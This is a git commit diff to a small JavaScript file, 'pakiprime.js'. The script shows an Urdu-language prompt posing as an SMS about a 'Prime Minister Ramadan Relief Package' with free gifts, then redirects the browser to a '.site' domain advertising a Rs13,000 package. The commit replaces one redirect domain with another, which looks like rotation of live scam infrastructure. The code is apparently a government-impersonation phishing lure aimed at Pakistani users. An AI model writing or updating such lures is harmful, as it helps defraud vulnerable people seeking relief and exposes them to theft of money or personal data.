ffb4980ff188aadf4544b79a34a7f65dacd21c2a
usorondo88 <panders.snip_9m@icloud.com>
2026-03-18 06:40:08 +0100

    Update pakiprime.js

--- pakiprime.js
+++ pakiprime.js
@@ -1,5 +1,5 @@
 var password = 'ابھی تحفے حاصل کریں۔'
 password=prompt('ایس ایم ایس: وزیراعظم رمضان ریلیف پیکیج میں خوش آمدید... کے لیے OK دبائیں۔','ابھی تحفے حاصل کریں۔');
 if (password != 'ابھی تحفے حاصل کریں۔') {
-location.href='https://www.olumbarhc.site/prime-minister-rs13000-ramadan-package';
+location.href='https://www.abarhnwa.site/prime-minister-rs13000-ramadan-package';
 }
